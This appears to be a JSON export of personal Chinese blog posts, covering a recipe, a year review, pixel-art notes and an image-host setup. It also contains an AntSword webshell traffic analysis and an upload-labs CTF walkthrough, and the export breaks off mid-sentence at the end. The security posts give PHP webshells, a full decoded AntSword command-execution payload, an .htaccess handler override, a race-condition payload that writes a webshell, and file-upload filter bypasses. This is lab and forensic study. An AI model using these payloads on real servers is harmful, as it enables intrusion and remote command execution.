[{"content":"前言 开始学做饭， 这篇文章就用来记录未来学会的菜\n赛螃蟹 食材 生姜、大蒜、葱、鸡蛋\n做法 生姜大蒜切碎，接着生姜大蒜葱按 2：1：1比例调合 放入食盐、糖、醋、胡椒粉、黄酒等调味料 将若干鸡蛋打到碗里，不进行搅拌 烧油，等油烧开放入鸡蛋，这里需要等待鸡蛋清成型后再用锅铲将蛋黄打烂 鸡蛋炒开后，放入准备的调料，继续炒 炒熟可以再加点香油 成品 总结 ​\t个人觉得这次没做好，首次做菜也出了不少问题。首先烧油前先将锅里的水烧干，不然油就会到处飞溅，当时把我吓的赶紧把火关了。然后需要等油烧开再倒鸡蛋，不然油会漂浮在蛋清上，还要等待更久时间才能使蛋清成型。第一次做菜也不确定调料的多少，所以都放的比较少，对我而言觉得醋可以多放一点，生姜少些，油也少些。\n","date":"2024-12-10T14:02:18+08:00","permalink":"https://blog.winglet.com/p/%E9%A3%9F%E8%B0%B1/","title":"食谱"},{"content":"2024总结 对我的2024年做个总结吧，今年一整年又是浑浑噩噩的，在实习和考研中我选择了考研，但说实话我选考研的目的还是为了逃避，因为我根本没想明白以后要干什么，所以学习是两天打鱼三天晒网，可以说什么都没学到。所以回顾这一整年就没有什么令人影响深刻的。然后今年的考研，我能做的就是过去看看题了，但我总不能啥也不写在那坐着，所以考前还是会突击一下。\n​\t以上是我对自己的抱怨，因为性格问题我总是在做某些事考虑着考虑那的，最后就导致我一直在空想，并没有实质去做些什么，比如我想学这个东西，我可能会去想我学了后以后能用上吗，学这个会不会耽误我做别的事的时间，和别人聊天也是想这想那的，想他会不会回复我，回复后我该怎么回答，然后就一直带着这些想法，导致睡觉也不踏实。这些都需要我一点一点去改变，不过知道这样不好也算是我的一个进步吧。\n​\t好了，不能这样内耗自己了，仔细想想今年还是做了些事的：考到了PTE证书，和隔壁宿舍更熟了，卧推从25斤到50斤，敢和以前同学进行交流等等，这些都算是我的进步。对于即将到来的2025年，为了有个目标，决定定以下计划：\n学习像素画，至少把教程看完画出一幅我认为好的画 考试成功 学会至少10种左右的饭菜 把爬虫文章写完 更新至少10篇技术性博客 还有一个目标，但我不知道能不能做到，先记录下来吧，挖到第一个洞\n","date":"2024-12-08T15:07:15+08:00","permalink":"https://blog.winglet.com/p/2024%E6%80%BB%E7%BB%93/","title":"2024总结"},{"content":"前言 ​\t很早以前想学画画了，可一直没有行动起来，然后玩了几个像素精品游戏，让我对像素画有兴趣。其实我们早就接触过像素画了，以前的街机游戏，因为设备原因，设计师都是通过像素来表现画面的，由那些有颜色的方块拼接成一个画面或人物。像素画看起来细节不多，但却精巧，这也是我想学习它的原因。但个人没有什么美术细胞，对色彩、线条理解不足，后面学习估计会比较困难。因此记录一下像素的基础学习，并时不时上传一下个人的练习作品。\n开始画像素 ​\t使用的软件是Asprite，在steam上卖70多软妹币，功能齐全，是专门用来创作像素画的软件。\n线条 ​\t先随便画个线，这个线条看着就不太舒服，因为我们用铅笔画线的时候都是很光滑的弯曲，但像素不同，像素是一个一个正方形色块组成的，所以边缘部位就会看着很尖。要使像素线条看着比较正常弯曲的话，就需要清理一些不必要的像素块。\n​\t画像素画时为了使线条比较光滑的弯曲，通常要色块对角线相接。但在表现物品某些部位的尖锐特点的时候不会擦去在这些色块。\n基本颜色 ​\t在画完图形框架后，就可以用可选颜色中选取，直接填充，之后再修改细节\n明暗 ​\t明暗是让你的画有层次感的关键了，不过我目前对明暗还不够敏感。物体的明暗需要你在生活中的观察，观察一个物体在光照中的色彩分布，这需要长久的练习。\n抗锯齿和优化 ​\t这个就需要把图形变得不那么\u0026quot;尖\u0026quot;，\n​\t这样对比就可以直观看出抗锯齿会对画的影响。\n​\t在优化过程中，也需要减少孤立像素点的产生，孤立像素点会增加细节，但也会使画变得凌乱，而且像素画的特点就是用少的像素点表现一幅画，有时不必要的细节是不需要的\n","date":"2024-10-18T21:59:53+08:00","permalink":"https://blog.winglet.com/p/%E5%83%8F%E7%B4%A0%E7%94%BB%E5%AD%A6%E4%B9%A0/","title":"像素画学习"},{"content":"前言 换个图床\ncloudflare创建存储库 左边栏选择R2-概述，然后点击创建存储桶\n接下来自定义存储桶的名称，这样就创建好了自己的存储桶\n进入存储桶的设置界面\n允许访问子域名，然后就会生成一个可以公共访问的url\n可以在这两个中选择一个\n之后会有密钥等重要信息，需要保存下来\npiclist 自定义节点就是编辑api令牌中的地址 自定义域名就是之前存储库生成的url ","date":"2024-09-15T23:35:57+08:00","image":"https://pub-491d983cd40449fea50cff8b66683e0d.r2.dev/img/202409160012295.png","permalink":"https://blog.winglet.com/p/cloudflare-piclist%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/","title":"Cloudflare+piclist搭建图床"},{"content":"前言 做应急响应题遇到了蚁剑流量分析的题，就正好研究一下\n蚁剑流量特征 基本特征 在kali虚拟机中用小皮面板开一个站点，然后上传一个木马文件\n内容如下\n#1.php \u0026lt;?php eval($_POST[\u0026#39;cmd\u0026#39;]); ?\u0026gt; 然后打开wireshark，接着用蚁剑进行连接，这时就可以抓到蚁剑流量的包了\n这个就是蚁剑连接该ip的流量包了，我们右键红框那条，然后查看TCP流\n这个就是蚁剑的流量包内容。现在可以总结蚁剑流量的基本特征\n1. 请求包中有`ini_set`函数 2. 连接命令在第一个=前 3. 使用的是php语言 执行命令 现在在蚁剑中打开虚拟终端，输入whoami命令\n接着去看流量包\n可以发现里面内容有了一些变化，将其url解码后，得到\ncmd=@ini_set(\u0026#34;display_errors\u0026#34;, \u0026#34;0\u0026#34;);@set_time_limit(0);$opdir=@ini_get(\u0026#34;open_basedir\u0026#34;);if($opdir) {$ocwd=dirname($_SERVER[\u0026#34;SCRIPT_FILENAME\u0026#34;]);$oparr=preg_split(base64_decode(\u0026#34;Lzt8Oi8=\u0026#34;),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item.\u0026#34;/.bf363c62\u0026#34;;@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set(\u0026#34;open_basedir\u0026#34;, \u0026#34;..\u0026#34;);$cntarr=@preg_split(\u0026#34;/\\\\\\\\|\\//\u0026#34;,$tmdir);for($i=0;$i\u0026lt;sizeof($cntarr);$i++){@chdir(\u0026#34;..\u0026#34;);};@ini_set(\u0026#34;open_basedir\u0026#34;,\u0026#34;/\u0026#34;);@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo \u0026#34;319\u0026#34;.\u0026#34;4a4\u0026#34;;echo @asenc($output);echo \u0026#34;5df\u0026#34;.\u0026#34;af0b\u0026#34;;}ob_start();try{$p=base64_decode(substr($_POST[\u0026#34;v1c2cd0fd6bb3\u0026#34;],2));$s=base64_decode(substr($_POST[\u0026#34;t29c2b8006f9cb\u0026#34;],2));$envstr=@base64_decode(substr($_POST[\u0026#34;j3bef2f7ea0db5\u0026#34;],2));$d=dirname($_SERVER[\u0026#34;SCRIPT_FILENAME\u0026#34;]);$c=substr($d,0,1)==\u0026#34;/\u0026#34;?\u0026#34;-c \\\u0026#34;{$s}\\\u0026#34;\u0026#34;:\u0026#34;/c \\\u0026#34;{$s}\\\u0026#34;\u0026#34;;if(substr($d,0,1)==\u0026#34;/\u0026#34;){@putenv(\u0026#34;PATH=\u0026#34;.getenv(\u0026#34;PATH\u0026#34;).\u0026#34;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34;);}else{@putenv(\u0026#34;PATH=\u0026#34;.getenv(\u0026#34;PATH\u0026#34;).\u0026#34;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;\u0026#34;);}if(!empty($envstr)){$envarr=explode(\u0026#34;|||asline|||\u0026#34;, $envstr);foreach($envarr as $v) {if (!empty($v)) {@putenv(str_replace(\u0026#34;|||askey|||\u0026#34;, \u0026#34;=\u0026#34;, $v));}}}$r=\u0026#34;{$p} {$c}\u0026#34;;function fe($f){$d=explode(\u0026#34;,\u0026#34;,@ini_get(\u0026#34;disable_functions\u0026#34;));if(empty($d)){$d=array();}else{$d=array_map(\u0026#39;trim\u0026#39;,array_map(\u0026#39;strtolower\u0026#39;,$d));}return(function_exists($f)\u0026amp;\u0026amp;is_callable($f)\u0026amp;\u0026amp;!in_array($f,$d));};function runshellshock($d, $c) {if (substr($d, 0, 1) == \u0026#34;/\u0026#34; \u0026amp;\u0026amp; fe(\u0026#39;putenv\u0026#39;) \u0026amp;\u0026amp; (fe(\u0026#39;error_log\u0026#39;) || fe(\u0026#39;mail\u0026#39;))) {if (strstr(readlink(\u0026#34;/bin/sh\u0026#34;), \u0026#34;bash\u0026#34;) != FALSE) {$tmp = tempnam(sys_get_temp_dir(), \u0026#39;as\u0026#39;);putenv(\u0026#34;PHP_LOL=() { x; }; $c \u0026gt;$tmp 2\u0026gt;\u0026amp;1\u0026#34;);if (fe(\u0026#39;error_log\u0026#39;)) {error_log(\u0026#34;a\u0026#34;, 1);} else {mail(\u0026#34;a@127.0.0.1\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;-bv\u0026#34;);}} else {return False;}$output = @file_get_contents($tmp);@unlink($tmp);if ($output != \u0026#34;\u0026#34;) {print($output);return True;}}return False;};function runcmd($c){$ret=0;$d=dirname($_SERVER[\u0026#34;SCRIPT_FILENAME\u0026#34;]);if(fe(\u0026#39;system\u0026#39;)){@system($c,$ret);}elseif(fe(\u0026#39;passthru\u0026#39;)){@passthru($c,$ret);}elseif(fe(\u0026#39;shell_exec\u0026#39;)){print(@shell_exec($c));}elseif(fe(\u0026#39;exec\u0026#39;)){@exec($c,$o,$ret);print(join(\u0026#34; \u0026#34;,$o));}elseif(fe(\u0026#39;popen\u0026#39;)){$fp=@popen($c,\u0026#39;r\u0026#39;);while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}elseif(fe(\u0026#39;proc_open\u0026#39;)){$p = @proc_open($c, array(1 =\u0026gt; array(\u0026#39;pipe\u0026#39;, \u0026#39;w\u0026#39;), 2 =\u0026gt; array(\u0026#39;pipe\u0026#39;, \u0026#39;w\u0026#39;)), $io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}@fclose($io[1]);@fclose($io[2]);@proc_close($p);}elseif(fe(\u0026#39;antsystem\u0026#39;)){@antsystem($c);}elseif(runshellshock($d, $c)) {return $ret;}elseif(substr($d,0,1)!=\u0026#34;/\u0026#34; \u0026amp;\u0026amp; @class_exists(\u0026#34;COM\u0026#34;)){$w=new COM(\u0026#39;WScript.shell\u0026#39;);$e=$w-\u0026gt;exec($c);$so=$e-\u0026gt;StdOut();$ret.=$so-\u0026gt;ReadAll();$se=$e-\u0026gt;StdErr();$ret.=$se-\u0026gt;ReadAll();print($ret);}else{$ret = 127;}return $ret;};$ret=@runcmd($r.\u0026#34; 2\u0026gt;\u0026amp;1\u0026#34;);print ($ret!=0)?\u0026#34;ret={$ret}\u0026#34;:\u0026#34;\u0026#34;;;}catch(Exception $e){echo \u0026#34;ERROR://\u0026#34;.$e-\u0026gt;getMessage();};asoutput();die();\u0026amp;j3bef2f7ea0db5=5j\u0026amp;t29c2b8006f9cb=dGY2QgIi93d3cvYWRtaW4vbG9jYWxob3N0XzgwL3d3d3Jvb3QiO3dob2FtaTtlY2hvIDE2Njc2Zjtwd2Q7ZWNobyA2MGRkNTY5MmYwYWI=\u0026amp;v1c2cd0fd6bb3=ToL2Jpbi9zaA== 可以感觉到后面这两段字符串很像base64编码，但是解码后是乱码，研究代码逻辑后会发现这些字符串是从第三个字符开始才是base64编码，前面两个字符是来混淆的。将其解码后得到\n上传文件 我们创建一个flag.txt文件,内容为\nwinglet 然后上传并抓包，得到\nbd01290c7a42fc=WGL3d3dy9hZG1pbi9sb2NhbGhvc3RfODAvd3d3cm9vdC9mbGFnLnR4dA==\u0026amp;cmd=@ini_set(\u0026#34;display_errors\u0026#34;, \u0026#34;0\u0026#34;);@set_time_limit(0);$opdir=@ini_get(\u0026#34;open_basedir\u0026#34;);if($opdir) {$ocwd=dirname($_SERVER[\u0026#34;SCRIPT_FILENAME\u0026#34;]);$oparr=preg_split(base64_decode(\u0026#34;Lzt8Oi8=\u0026#34;),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item.\u0026#34;/.fdc0c2f\u0026#34;;@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set(\u0026#34;open_basedir\u0026#34;, \u0026#34;..\u0026#34;);$cntarr=@preg_split(\u0026#34;/\\\\\\\\|\\//\u0026#34;,$tmdir);for($i=0;$i\u0026lt;sizeof($cntarr);$i++){@chdir(\u0026#34;..\u0026#34;);};@ini_set(\u0026#34;open_basedir\u0026#34;,\u0026#34;/\u0026#34;);@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo \u0026#34;7c10b\u0026#34;.\u0026#34;57b77\u0026#34;;echo @asenc($output);echo \u0026#34;1f6c\u0026#34;.\u0026#34;800e3\u0026#34;;}ob_start();try{$f=base64_decode(substr($_POST[\u0026#34;bd01290c7a42fc\u0026#34;],2));$c=$_POST[\u0026#34;j26d10e499b152\u0026#34;];$c=str_replace(\u0026#34;\\r\u0026#34;,\u0026#34;\u0026#34;,$c);$c=str_replace(\u0026#34;\\n\u0026#34;,\u0026#34;\u0026#34;,$c);$buf=\u0026#34;\u0026#34;;for($i=0;$i\u0026lt;strlen($c);$i+=2)$buf.=urldecode(\u0026#34;%\u0026#34;.substr($c,$i,2));echo(@fwrite(fopen($f,\u0026#34;a\u0026#34;),$buf)?\u0026#34;1\u0026#34;:\u0026#34;0\u0026#34;);;}catch(Exception $e){echo \u0026#34;ERROR://\u0026#34;.$e-\u0026gt;getMessage();};asoutput();die();\u0026amp;j26d10e499b152=77696E676C65740D0A 这里文件里内容的关键就在\nj26d10e499b152=77696E676C65740D0A 不过这个不是什么编码，研究代码逻辑后，会发现解密关键在于将每两个字符前面加上%，然后进行url解码。可以编写脚本\nfrom urllib.parse import unquote,quote a = \u0026#34;77696E676C65740D0A\u0026#34; for i in range(0,len(a),2): if __name__ == \u0026#39;__main__\u0026#39;: tmp = unquote(f\u0026#34;%{a[i]}{a[i+1]}\u0026#34;) print(tmp, end=\u0026#34;\u0026#34;) # winglet 下载文件 通过蚁剑下载该站点的一个文件后，抓取流量，内容如下\ncmd=@ini_set(\u0026#34;display_errors\u0026#34;, \u0026#34;0\u0026#34;);@set_time_limit(0);$opdir=@ini_get(\u0026#34;open_basedir\u0026#34;);if($opdir) {$ocwd=dirname($_SERVER[\u0026#34;SCRIPT_FILENAME\u0026#34;]);$oparr=preg_split(base64_decode(\u0026#34;Lzt8Oi8=\u0026#34;),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item.\u0026#34;/.b6be21d1b36\u0026#34;;@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set(\u0026#34;open_basedir\u0026#34;, \u0026#34;..\u0026#34;);$cntarr=@preg_split(\u0026#34;/\\\\\\\\|\\//\u0026#34;,$tmdir);for($i=0;$i\u0026lt;sizeof($cntarr);$i++){@chdir(\u0026#34;..\u0026#34;);};@ini_set(\u0026#34;open_basedir\u0026#34;,\u0026#34;/\u0026#34;);@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo \u0026#34;a58b4c\u0026#34;.\u0026#34;6a1088\u0026#34;;echo @asenc($output);echo \u0026#34;0f00\u0026#34;.\u0026#34;6f47c\u0026#34;;}ob_start();try{$F=base64_decode(substr(get_magic_quotes_gpc()?stripslashes($_POST[\u0026#34;nf74681be6e0e5\u0026#34;]):$_POST[\u0026#34;nf74681be6e0e5\u0026#34;],2));$fp=@fopen($F,\u0026#34;r\u0026#34;);if(@fgetc($fp)){@fclose($fp);@readfile($F);}else{echo(\u0026#34;ERROR:// Can Not Read\u0026#34;);};}catch(Exception $e){echo \u0026#34;ERROR://\u0026#34;.$e-\u0026gt;getMessage();};asoutput();die();\u0026amp;nf74681be6e0e5=gQL3d3dy9hZG1pbi9sb2NhbGhvc3RfODAvd3d3cm9vdC9mbGFnLnR4dA== 将下面的编码解码后可得\n/www/admin/localhost_80/wwwroot/flag.txt 为该文件在站点的绝对路径。\n","date":"2024-05-07T22:24:33+08:00","image":"https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405082248171.png","permalink":"https://blog.winglet.com/p/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","title":"蚁剑流量分析"},{"content":"前言 重新打一下upload-labs靶场，这次会尽可能从代码原理方面去理解漏洞的产生与影响。\n搭建 这里我使用的是一位大佬自己搭建的upload靶场，不过知识点还是一样的。GitHub - sqlsec/upload-labs-docker: 国光的文件上传靶场，基于 upload-labs 定制\n下载他的压缩包后，解压用docker搭建即可。\n如果用的最新版docker的话，起镜像的名令为\ndocker compose up -d upload_1 [JS] 漏洞分析 这关漏洞在于它只进行前端验证。右键查看源代码\n可以看到这段js代码的作用就是对上传的文件进行判断和过滤。\n就是我们只有在上传.jpg .png .gif .jpeg后缀文件时，才能上传成功。\n但是它只进行了前端验证，所以只要上传一个符合条件的文件，在前端验证完把文件放走后用bp抓包，在它即将把数据发送给后端时，将文件名修改为.php文件，就能成功上传该木马。\n解决方法 我们先创建一个一句话木马文件，内容如下\n\u0026lt;?php @eval($_POST[1]); ?\u0026gt; 将其后缀改为.jpg，上传并用burpsuite抓包，抓到的数据如下\n然后将文件后缀改为.php，并放包\n这个就是我们上传的文件了，然后我们右键它复制链接\n找到上传的地址了，接下来用蚁剑连接\n出现这个绿标就宣告我们成功了\nupload-2 [.htaccess] 漏洞分析 这个靶场带有源码，所以就用源码来讲解，如果是实际情况，那肯定是不能看到的，只能自己去一个一个尝试。\n这个黑名单就是这段代码的关键点，可以看到它过滤了很多可执行文件，并且因为这个并不是上一关的js前端审核，我们无法通过抓包改后缀的方法去绕过。\n那么这关的思路就是它在页面上的提示了.htaccess文件。\n.htaccess是一个用于配置Apache HTTP服务器的文件。它通常位于网站的根目录或特定目录下，通过在文件中编写一些规则和指令，可以对该目录或其子目录的行为进行自定义设置。它允许您在不修改服务器配置文件的情况下，对特定目录或网站的行为进行修改。可以在.htaccess文件中添加各种指令，例如重定向规则、访问控制、错误页面定义、缓存控制等。 这个黑名单是没有过滤这个后缀的，所以就可以上传.htaccess文件，它里面的内容就写成\n\u0026lt;FilesMatch \u0026#34;.jpg\u0026#34;\u0026gt; SetHandler application/x-httpd-php \u0026lt;/FilesMatch\u0026gt; 这段代码是一个Apache HTTP服务器的配置，用于将对以\u0026#34;.jpg\u0026#34;结尾的URL请求的处理器设置为PHP解析器。当Apache服务器收到以\u0026#34;.jpg\u0026#34;结尾的请求时，它会将请求交给PHP解析器来处理，而不是将其作为静态图片文件返回。 在这段配置中，\u0026lt;FilesMatch\u0026gt;标签用于匹配特定的文件名模式，这里是匹配以\u0026#34;.jpg\u0026#34;结尾的文件。SetHandler指令用于设置与匹配的文件相关联的处理器，这里是将处理器设置为application/x-httpd-php，即PHP解析器。 起到的作用就是，我们上传的.jpg文件，会被自动当作.php文件进行执行。\n解决方法 首先创建一个.htaccess文件，在里面写入上面说的内容，然后上传\n可以看到我们上传成功了，接着把一句话木马的后缀改为.jpg，直接上传\n接下来就用蚁剑连接\n连接成功，而且可以看到我们连接的文件后缀还是.jpg\nupload-3 [MIME] 漏洞分析 我们先介绍一下MIME\nMIME（Multipurpose Internet Mail Extensions）是一种标准，用于标识互联网上不同类型的文件和媒体内容。MIME类型由两部分组成：主类型（top-level type）和子类型（sub-type），用斜杠分隔。例如，`text/html`和`image/jpeg`都是MIME类型。 MIME类型用于指示文件或数据的性质和格式，以便客户端和服务器可以正确地处理和解释内容。它在HTTP协议中的`Content-Type`头部字段中使用。 这关没有源码可看，但对上传文件还是进行了限制。需要测试什么文件类型可以上传，然后我们再上传木马文件，并将其的MIME类型修改为可以上传的类型。\n解决方法 我们先上传.jpg文件，并抓包看看数据\n发现这个文件类型可以成功上传，接着我们可以把文件后缀改为.php文件，继续上传发现依然能上传成功。但是如果我们一开始就上传.php文件，就会发现无法上传，因为上传.php文件后content-type的值就会变成\nContent-Type: application/x-php 这个文件类型是不能上传成功的类型，接着直接蚁剑连接\n成功\nupload-4 [文件头] 漏洞分析 这关有源码，所有就可以看源码进行分析。\n这就是关键的部分，可以看到有两个白名单，第一个就是上一关讲到的MIME类型，这个绕过的方法就不再讲述了。\n第二个就是检测你的文件头，看你的文件头是否和.gif .jpg .png文件的文件头一致，而我们只需要在代码前面加上相应的文件头字符串即可。常用的就是GIF89a\n解决方法 先上传一句话木马文件，然后抓包\n这两处就是我们需要修改的部分，改为\n然后发包，即可上传成功，接着就可以蚁剑连接。\nupload-5 [代码缺陷1] 漏洞分析 有缺陷的代码，已经在界面上展示了，所以就直接分析这三句代码即可。可以看到它还是设了一个黑名单，不过它与前几关的不同点是它并没有禁止这些文件上传，而是修改这些文件的名称。比如上传了一个1.php的文件，它依然可以上传成功，但是我们会搜不到这个文件。因为该文件名称中有php这段字符串，所以就会把它替换为空字符，文件名就变成了1。\n所以我们的绕过方法就是用字符拼接进行绕过。比如上传1.pphphp\n它会检测到php这段字符串，但是就算把它替换为空字符了,我们的文件依然是php文件\n1.pphphp --\u0026gt; 1.php 解决方法 把木马文件的后缀改为.pphphp，然后上传\n然后就会发现上传的文件依然是.php文件\n接着用蚁剑连接即可\nupload-6 [代码缺陷2] 漏洞分析 这个问题代码其实和上关差不多，但是它是把黑民单的字符改为了空格符，这就导致字符复写的方法用不了了，但是它提示我们用的系统是Windows系统，在Windows系统中是区分大小写的，所以就可以通过大小写进行绕过。linux系统是不区分大小写的，所以大小写绕过的方法是无法成功的。\n解决方法 将后缀改为.PHp，然后上传\n文件后缀没有改变。\nupload-7 [GET型%00截断] 漏洞分析 这是上传部分的代码。\n这个方法页面也给出了，接下来就讲解一下%00截断的原理。%00其实就是十六进制的\\x00它们对应的ascii码值是0,但是它所表示的并不只是一个数字0，这是网上搜到的解释\n也就是说它还表示NULL和空字符，在低版本PHP中空字符表示着一行代码的结束。\nupload/1.php%001.png\t--\u0026gt;\t1.php 如果get传参是这样的数据，最后会被认为是1.php文件，而后面的1.png就会被省略。%00截断的原理大概就是这样了。但为什么使用%00可以绕过这个文件上传呢。这就要分析代码。\n这是我们上传并抓包得到的数据。我们上传一个jpg文件，来通过白名单。之后存储文件的时候\n$des = $_GET[\u0026#39;road\u0026#39;] . \u0026#34;/\u0026#34; . $filename; 这里的road=../upload/1.php%004535524.jpg，%00后面的被省略了，就导致我们上传的是1.php文件，而1.jpg文件中的内容也会被写入1.php文件内，通过这中方法就上传了一个木马文件。\nupload-9 [黑名单缺陷] 漏洞分析 这关的问题主页已经提到了，就是在设置黑名单的时候，忽略了其他文件，导致那些文件正好也可以被执行。比如在apache服务器中，除了.php文件会被作为php文件执行，还有\nphtml php5 php3 php4 pht phps php3p 所以就可以把木马文件的后缀改为它们中的一个，依然可以上传成功。\n解决方法 将文件后缀改为phtml，然后上传。上传成功后用蚁剑连接\n连接成功\nupload-10 [条件竞争] 漏洞分析 ​\t直接看代码，可以看到文件先会被成功上传，然后才会根据白名单，进行修改文件名或者删除文件，所以如果我们能在程序在改变文件之前访问文件，就能成功执行该木马文件。但因为它只能存在一会儿，所以木马的内容需要修改\n\u0026lt;?php fputs(fopen(\u0026#39;xiao.php\u0026#39;,\u0026#39;w\u0026#39;),\u0026#39;\u0026lt;?php eval($_REQUEST[1]);?\u0026gt;\u0026#39;);?\u0026gt; 这段代码意思就是在当前目录下创建一个名为xiao.php的一句话木马，只要我们执行了文件，就能成功写入一句话木马。\n解决方法 上传文件，然后用bp抓包\n右键选择intruder，选择Null payloads\n然后我们访问它即将上传的网站路径，再次抓包，然后如上的操作，之后点击开始攻击\n右边爆破的长度出现变化，说明执行成功了，接下来就可以访问到xiao.php文件，用蚁剑成功连接\nupload-11 [二次渲染] 漏洞分析 这里的关键就在于imagecreatefromxxx这个函数，它会把我们上传的图片文件进行一次渲染，导致的结果就是图片中的二进制数据可能会发生改变，也就是我们上传的图片码会被渲染成一张普通图片，里面用于执行的代码可能会被修改删除。但是我们依然有绕过的办法，就如该页面所给出的提示。\ngif 准备一张gif图\n我们把它上传上去，然后将渲染后的图片保存到本地，接着将两张图片放入010editor进行比较\n灰色的部分就是没有发生变化的部分，所以我们可以把代码写入灰色部分。\n然后再次将它上传，将渲染后的gif图保存到本地\n可以看到payload没有被删除，个人感觉gif是最简单的。\njpg png 这两个都需要脚本进行修改，人比较懒后面再进行补充\n解决方法 上面的方法是我们如何将payload成功填入文件，并上传，但上传后该怎么使用呢。其实可以注意到这关的网址和之前是有一点区别的\nhttp://ip:30011/?file=hint.html 多了一个file参数，在没有看源码时可以猜测，这里可能存在文件包含漏洞，我们传入/etc/passwd\n确实存在文件包含漏洞，所以我们只要包含上传图片的路径，就能执行里面的payload了，然后用蚁剑连接\nupload-12 [move_uploaded_file缺陷] 漏洞分析 这里要用到move_uploaded_file函数的一个缺陷。当我们能能控制$img_path的值时，如果我们输入1.php/.，该函数会将其判断为1.php，但是由于我们在上传时文件名是1.php/.，所以可以绕过黑名单\n解决方法 然后访问\n可以看到文件成功上传\nupload-13 [代码审计] 漏洞分析 既然这里说到了要代码审计，那就直接查看代码，这就是关键代码\n\u0026lt;?php header(\u0026#34;Content-type: text/html;charset=utf-8\u0026#34;); error_reporting(0); //设置上传目录 define(\u0026#34;UPLOAD_PATH\u0026#34;, dirname(__FILE__) . \u0026#34;/upload/\u0026#34;); define(\u0026#34;UPLOAD_URL_PATH\u0026#34;, str_replace($_SERVER[\u0026#39;DOCUMENT_ROOT\u0026#39;], \u0026#34;\u0026#34;, UPLOAD_PATH)); if (!file_exists(UPLOAD_PATH)) { mkdir(UPLOAD_PATH, 0755); } $is_upload = false; if (!empty($_POST[\u0026#39;submit\u0026#39;])) { $allow_type = array(\u0026#39;image/jpeg\u0026#39;,\u0026#39;image/png\u0026#39;,\u0026#39;image/gif\u0026#39;); if(!in_array($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;],$allow_type)){ echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; } else { $file = empty($_POST[\u0026#39;save_name\u0026#39;]) ? $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;] : $_POST[\u0026#39;save_name\u0026#39;]; if (!is_array($file)) { $file = explode(\u0026#39;.\u0026#39;, strtolower($file)); } $ext = end($file); $allow_suffix = array(\u0026#39;jpg\u0026#39;,\u0026#39;png\u0026#39;,\u0026#39;gif\u0026#39;); if (!in_array($ext, $allow_suffix)) { echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; } else { $file_name = reset($file) . \u0026#39;.\u0026#39; . $file[count($file) - 1]; $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH . \u0026#39;/\u0026#39; .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { echo \u0026#34;\u0026lt;script\u0026gt;error();\u0026lt;/script\u0026gt;\u0026#34;; } } } } ?\u0026gt; if (!empty($_POST[\u0026#39;submit\u0026#39;])) { $allow_type = array(\u0026#39;image/jpeg\u0026#39;,\u0026#39;image/png\u0026#39;,\u0026#39;image/gif\u0026#39;); if(!in_array($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;],$allow_type)){ echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; } else { 这里就是检测你的文件类型，文件类型需要符合这个白名单才能进行下一步。绕过方法之前也用到过\n$file = empty($_POST[\u0026#39;save_name\u0026#39;]) ? $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;] : $_POST[\u0026#39;save_name\u0026#39;]; if (!is_array($file)) { $file = explode(\u0026#39;.\u0026#39;, strtolower($file)); } 这里就是获取上传文件名，如果参数save_name里面有值，就会把它的值赋给$file，可以发现在上传文件的时候save_name是可控的，这里就是这关的突破口。接下来是判断$file是不是数组类型，不是就会以.为分界创建数组。比如上传的是1.jpg经过这段语句就会变成array[\u0026quot;1\u0026quot;,\u0026quot;jpg\u0026quot;]\n$ext = end($file); $allow_suffix = array(\u0026#39;jpg\u0026#39;,\u0026#39;png\u0026#39;,\u0026#39;gif\u0026#39;); if (!in_array($ext, $allow_suffix)) { echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; 取数组$file 的最后一位，也就是后缀名，进行判断查看是否在白名单之内\n} else { $file_name = reset($file) . \u0026#39;.\u0026#39; . $file[count($file) - 1]; $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH . \u0026#39;/\u0026#39; .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { echo \u0026#34;\u0026lt;script\u0026gt;error();\u0026lt;/script\u0026gt;\u0026#34;; } 这里定义就是文件上传后的命名以及存储位置。比如$file=array['1','jpg'] 